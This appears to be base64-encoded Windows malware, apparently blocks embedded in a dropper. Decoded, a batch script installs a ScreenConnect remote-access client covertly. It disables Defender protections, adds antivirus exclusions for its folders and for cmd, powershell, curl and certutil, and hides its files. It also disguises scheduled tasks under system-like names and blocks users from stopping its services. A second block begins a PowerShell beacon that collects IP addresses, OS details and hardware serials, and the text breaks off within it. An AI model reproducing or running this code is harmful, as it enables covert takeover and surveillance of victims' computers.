ZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdy
eXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJLRUVQMz0lJUwiDQpz
ZXQgIkdSWVhBPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dy
YW1GaWxlcyUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9
JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1rZGly
ICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51
bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUgJVRJTUUlIFM5Pj4iJUxPRyUiDQoNClJF
TSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNpZXMgKDE2MjUpIC0tLQ0KUkVNIERpc2Fi
bGVNU0k6IDA9YWxsb3csIDE9bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZvcmNlIDANCnJlZyBh
ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5
c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBkZWxl
dGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxQb2xpY2ll
c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAv
dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBEZWZlbmRlcjogcmVnaXN0
cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5jZSBrZXlzKSAtLS0NCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2Fi
bGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1l
IFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlQmVoYXZp
b3JNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
UHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9m
ID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
ZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5u
aW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QyJSIgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxXaW5kb3dzXFRl
bXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVRFTVAl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
bHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
aW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90
IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1
cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8gKA0K
ICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4g
cmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURp
c2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJv
dGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0
cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xU
ZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScp
OyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZp
bGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZv
ckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9W0Vu
dmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXsk
cGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0
IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9
KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3Qg
LVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7IEFkZC1N
cFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgk
eCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhl
JywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVl
bkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
blByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4
dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0g
QUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNh
bGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRl
IHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRvIE5PVCBo
aWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92ZXIgK2gg
K3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mg
c2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAl
JUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0K
ICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4mMQ0K
KQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVsZXRlIHdp
dGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNlcnZlciBE
aWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJi
YWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVh
ZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVu
dGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlk
ZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNL
X1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxhU2VydmVy
SGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQogICJmb3Jl
YWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8
IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06
RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIuZXhlICto
ICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9v
dCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06
RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0
IGluc3RhbGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBicmVh
a3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJTkUNClJFTSB3aGls
ZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVuZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2
aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBi
dWlsZCBMb2NrRGlyJ2QgdGhlc2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmaW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5sb2NrX3ByaW9y
X2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAgICAgICIlUEYlXFNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDIlKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIN
CiAgICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQ
Rjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAgICAgIGlmIGV4aXN0ICIl
JX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQiIC9SIC9EIFkgPm51bCAyPiYxDQogICAg
ICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2Fj
bHMgIiUlfkQiIC9ncmFudCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElO
XEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0KICAg
IGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICApDQopIGVsc2UgKA0K
ICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBT
QyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJz
IGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4g
Y2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQ
RFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5l
eGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIg
IiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNEJSIgPm51bCAyPiYx
DQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNv
bmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhB
JSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0g
ODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4
ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9y
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+
PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlz
dCAiJVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRl
ZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+bnVs
IDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNscyAiJVQl
IiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJV
c2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRF
UkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNiAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXA7IGR5bmFtaWMgZ3J5eGEgRlAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV1bc3RyaW5nXSRTdGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtz
dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRl
bXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNl
dCgncmljaCcsICdjb21wYWN0JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmdd
JEJ1aWxkID0gJ08xNScsCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25Q
cmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2ls
ZW50bHlDb250aW51ZScKdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQ
cm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9Cgpm
dW5jdGlvbiBHZXQtQ2ZnIHsKICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJwogICAgJGNmZyA9IEB7fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0
dXJuICRjZmcgfQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1P
YmplY3QgewogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMq
KC4qKVxzKiQnKSB7CiAgICAgICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0u
VHJpbSgpCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtz
dHJpbmddJHMpIHsKICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVy
biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNl
ICc+JywgJyZndDsnKQp9CgpmdW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUg
aW4gQCgKICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdo
dHRwczovL2lmY29uZmlnLm1lL2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNv
bScKICAgICAgICApKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2Vi
UmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAg
ICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAo
JGlwIC1tYXRjaCAnXlxkezEsM30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6Jykg
eyByZXR1cm4gJGlwIH0KICAgICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScK
fQoKZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1O
ZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAn
MTI3LionIC1hbmQgJF8uUHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAg
ICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAg
ICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQog
ICAgdHJ5IHsKICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFw
dGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBG
b3JFYWNoLU9iamVjdCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAk
XyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgk
aXBzKSB7IHJldHVybiAoKCRpcHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcp
IH0KICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZv
IHsKICAgICRvID0gW29yZGVyZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24g
PSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24v
YSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAn
bi9hJzsgTWFudWZhY3R1cmVyID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2En
CiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1Np
emVfR0IgPSAnbi9hJwogICAgfQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFu
Y2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9u
CiAgICAgICAgJG8uVmVyc2lvbiA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXIKICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAg
JG8uSW5zdGFsbERhdGUgPSAoJG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCcpCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0
LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0Ig
